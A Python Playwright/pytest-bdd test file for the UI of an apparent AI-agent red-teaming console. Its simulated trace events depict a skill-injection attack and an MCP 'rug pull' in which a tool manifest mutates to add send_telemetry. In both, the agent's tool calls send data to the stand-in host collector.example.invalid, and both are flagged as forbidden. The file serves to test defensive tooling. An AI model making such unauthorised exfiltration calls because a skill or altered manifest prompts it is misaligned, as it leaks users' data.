"""Playwright UI scenarios for Agent Skills (008 FR-8) and MCP Injection (007 FR-8)."""

from __future__ import annotations

from playwright.sync_api import Page, expect
from pytest_bdd import given, parsers, scenarios, then, when

scenarios("features/agent_attacks.feature")


@given("the Myrtia console is open", target_fixture="ui")
def console_is_open(console_page: Page) -> Page:
    return console_page


@when(parsers.parse('I select the "{attack_id}" attack'))
def select_attack(ui: Page, attack_id: str) -> None:
    ui.evaluate(
        """(aid) => {
            const sel = document.getElementById('attack');
            sel.value = aid;
            onAttackChange();
            document.querySelectorAll('details').forEach(d => {
                if (d.textContent.includes('Advanced')) d.open = true;
            });
        }""",
        attack_id,
    )


@then(parsers.parse('the attack configuration shows "{label_text}"'))
def config_shows_label(ui: Page, label_text: str) -> None:
    expect(ui.locator("body")).to_contain_text(label_text)


@when("skill attack events are rendered in the live trace")
def render_skill_events(ui: Page) -> None:
    ui.evaluate(
        """() => {
            const box = document.createElement('div');
            box.id = 'test-skill-trace';
            const events = [
                {type: 'skill.loaded', payload: {skill_name: 'audit-helper', skill_family: 'Contextual SKILL-INJECT'}},
                {type: 'skill.tool_called', payload: {turn: 1, tool: 'send_http', arguments: {url: 'https://collector.example.invalid/ingest'}, forbidden: true}},
                {type: 'skill.tool_responded', payload: {turn: 1, tool: 'send_http', response: 'HTTP 200 OK (simulated)'}},
                {type: 'skill.forbidden_action', payload: {variant: 'contextual_exfil', tool: 'send_http', reason: 'Unauthorized external HTTP call'}},
            ];
            events.forEach(ev => box.appendChild(evNode(ev)));
            document.body.appendChild(box);
        }"""
    )


@when("MCP injection events are rendered in the live trace")
def render_mcp_events(ui: Page) -> None:
    ui.evaluate(
        """() => {
            const box = document.createElement('div');
            box.id = 'test-mcp-trace';
            const events = [
                {type: 'mcp.manifest_loaded', payload: {mcp_family: 'MCP Rug Pull', tools: ['calc-mcp.add_numbers']}},
                {type: 'mcp.manifest_mutated', payload: {turn: 1, tools: ['calc-mcp.add_numbers', 'calc-mcp.send_telemetry']}},
                {type: 'mcp.tool_called', payload: {turn: 2, server: 'calc-mcp', tool: 'send_telemetry', arguments: {url: 'https://collector.example.invalid/rugpull'}, forbidden: true}},
                {type: 'mcp.tool_responded', payload: {turn: 2, server: 'calc-mcp', tool: 'send_telemetry', response: 'HTTP 200 OK'}},
                {type: 'mcp.forbidden_action', payload: {variant: 'rug_pull', server: 'calc-mcp', tool: 'send_telemetry', reason: 'Unauthorized MCP exfiltration'}},
            ];
            events.forEach(ev => box.appendChild(evNode(ev)));
            document.body.appendChild(box);
        }"""
    )


@then(parsers.parse('the live trace shows role "{role_label}"'))
def trace_shows_role(ui: Page, role_label: str) -> None:
    expect(ui.locator(".ev .role", has_text=role_label).first).to_be_visible()


@then(parsers.parse('the live trace shows a blocked warning for "{role_label}"'))
def trace_shows_blocked_warning(ui: Page, role_label: str) -> None:
    blocked = ui.locator(".ev.blocked .role", has_text=role_label)
    expect(blocked.first).to_be_visible()

